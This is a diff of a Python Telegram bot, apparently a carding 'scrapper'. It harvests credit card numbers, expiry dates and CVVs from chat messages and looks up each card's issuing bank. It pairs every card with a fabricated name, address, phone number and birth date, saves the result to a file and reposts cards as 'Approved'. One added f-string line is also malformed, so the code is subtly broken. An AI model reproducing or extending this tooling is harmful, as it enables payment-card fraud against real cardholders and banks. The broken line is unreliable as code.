@@ -58,35 +58,28 @@ async def my_event_handler(m):
         return
     ccs.append(cc)
     extra = cc[0:0+12]
-    bin = requests.get(f'https://www.binapi.co.uk/bin={cc[:6]}')
+    bin = requests.get(f'https://projectslost.xyz/bin/?bin={cc[:6]}')
     if not bin:
         return
     bin_json =  bin.json()
-    img = ["ibai1.mp4", "ibai-koi.mp4"]
-    rando = random.choice(img)
     addr = real_random_address()
     fullinfo = f"{cc}|{mes}|{ano}|{cvv}|{names.get_full_name()}|{addr['address1']}|{addr['city']}|{addr['state']}|{addr['postalCode']}|{phone()}|dob: {datetime.strftime(datetime(random.randint(1960, 2005), random.randint(1, 12),random.randint(1, 28), ), '%Y-%m-%d')}|United States Of America"
     text = f"""
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-            **点 𝙸𝚋𝚊𝚒 𝚂𝚌𝚛𝚊𝚙𝚙𝚎𝚛 点**
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                                  
-**Card** ➪ `{cc}|{mes}|{ano}|{cvv}`
+🔱 𝙎𝙘𝙧𝙖𝙥𝙥𝙚𝙧 𝛥「𝚃𝙱」 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 🔱                               
+𝘾𝘾: `{cc}|{mes}|{ano}|{cvv}`
 **Status ➪ Approved! ✅**
-— — — — — — — — — — — — — — —
-               **☘ INFO CARD ☘**
-— — — — — — — — — — — — — — —
-[🝂] 𝘽𝙞𝙣 𝗜𝗻𝗳𝗼 - `{cc[:6]}`
-[🝂] 𝗜𝗻𝗳𝗼 - `{bin_json['brand']} - {bin_json['type']} - {bin_json['level']}`
-[🝂] 𝘽𝙖𝙣𝙠 - `{bin_json['bank']}`
-[🝂] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - `{bin_json['country']} - {bin_json['code']} - {bin_json['flag']}`
-━━━━━━━━━━━━━━━━
-[🝂] 𝗘𝘅𝘁𝗿𝗮 `{extra}xxxx|{mes}|{ano}|rnd`
-━━━━━━━━━━━━━━━━
+𝘽𝙞𝙣: `{cc[:6]}`
+𝘽𝙞𝙣 𝙏𝙮𝙥𝙚: `{bin_json['brand']} - {bin_json['type']} - {bin_json['level']}`
+𝘽𝙖𝙣𝙠: `{bin_json['bank']['name']}`
+𝘾𝙤𝙪𝙣𝙩𝙧𝙮: `{bin_json['country']['name']} - {bin_json['country']['flag']`
+━━━━━━━━━━━━━━━━━
+𝙀𝙭𝙩𝙧𝙖 - `{extra}xxxx|{mes}|{ano}|rnd`
+━━━━━━━━━━━━━━━━━
 """    
     print(f'{cc}|{mes}|{ano}|{cvv}')
     with open('cards.txt', 'a') as w:
         w.write(fullinfo + '\n')     
-    await client.send_message(SEND_CHAT, text, file = random)
+    await client.send_message(SEND_CHAT, text, file = "tae.jpg")
 
 @client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'[./!]extrap( (.*))')))
 async def my_event_handler(m):
